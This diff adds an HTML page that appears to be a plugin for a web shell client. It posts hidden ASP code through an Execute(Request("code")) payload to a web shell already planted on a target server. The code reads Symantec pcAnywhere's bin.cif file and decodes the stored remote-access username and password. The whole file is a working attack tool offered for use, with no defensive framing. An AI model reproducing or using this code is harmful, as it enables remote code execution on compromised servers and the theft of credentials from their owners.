@@ -1,0 +1,115 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">PcAnywhere Reader ==> <A HREF="http://www.rootkit.net.cn" target=_blank>Bin</A> ==> <A HREF="mailto:master@rootkit.net.cn">:)</A><hr>
+</div>
+<form name="xform" method="post" target="_blank">
+<table width="80%"  border="0">
+    <tr>
+      <td width="9%">FilePath: </td>
+      <td width="91%"><input name="path" type="text" value="C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\bin.cif" size="80"></td>
+    </tr>
+  </table>
+<textarea name="code" cols="80" rows="20" style="display:none">
+ ''============================¶ÁÈ¡ÎÄ¼þ=============================
+Function StreamLoadFromFile(sPath)
+		Dim oStream
+		Set oStream = Server.CreateObject("Adodb.Stream")
+		With oStream
+			.Type = 1
+			.Mode = 3
+			.Open
+			.LoadFromFile(sPath)
+			.Position = 0
+			StreamLoadFromFile = .Read
+			.Close
+		End With
+		Set oStream = Nothing
+	End Function
+''===============================hexdec ================================
+Function hexdec(strin) 
+    Dim i, j, k, result 
+    result = 0 
+    For i = 1 To Len(strin) 
+        If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
+           j = 15 
+        End If 
+        If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
+           j = 14 
+        End If 
+        If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
+           j = 13 
+        End If 
+        If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
+           j = 12 
+        End If 
+        If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
+           j = 11 
+        End If 
+        If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
+           j = 10 
+        End If 
+        If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
+           j = CInt(Mid(strin, i, 1)) 
+        End If 
+        For k = 1 To Len(strin) - i 
+             j = j * 16 
+        Next 
+        result = result + j 
+    Next 
+    hexdec = result 
+End Function 
+
+''=================================Crack Main===================================
+
+Function PcAnywhere(data,mode)
+  HASH= Mid(data,3)
+  If mode = "pass" Then number = 32  : Cifnum = 144
+  If mode = "user" Then number = 30  : Cifnum = 15
+  For i = 1 To number Step 2   
+          pcstr=((hexdec(Mid(data,i,2)) xor hexdec(Mid(hash,i,2))) xor Cifnum)
+          If ((pcstr <= 32) Or (pcstr>127)) Then Exit For 
+          decode = decode + Chr(pcstr)
+          Cifnum=Cifnum+1
+  Next 
+          PcAnywhere=decode
+End function
+''======================================bin2hex======================================
+Function bin2hex(binstr)
+    For i = 1 To LenB(binstr)
+		
+            hexstr = Hex(AscB(MidB(binstr, i, 1)))
+			
+            If Len(hexstr)=1 Then 
+                    bin2hex=bin2hex&"0"&(LCase(hexstr))
+            Else
+                    bin2hex=bin2hex& LCase(hexstr)
+            End If 
+           
+    Next
+End Function 
+''=============================================end =====================================
+CIF = Request("path")
+If CIF <> "" Then 
+BinStr=StreamLoadFromFile(CIF) 
+Response.write "Pcanywhere Reader :)==>Bin<br><br>"
+Response.write "PATH:"&CIF&"<br>"
+Response.write "USER:"&PcAnywhere (Mid(bin2hex(BinStr),919,64),"user")
+Response.write "<br>"
+Response.write "PASS:"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),"pass")
+End If 
+</textarea>
+<PRE>
+&lt;%
+<script>
+document.write(document.xform.code.innerHTML);</script>
+%&gt;
+</PRE>
+<hr>
+<input type="hidden" name="china" value='Execute(&quot;Execute(Request(&quot;&quot;code&quot;&quot;))&quot;)'>
+</form>
+<script>
+function RUNonclick(){
+document.xform.china.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
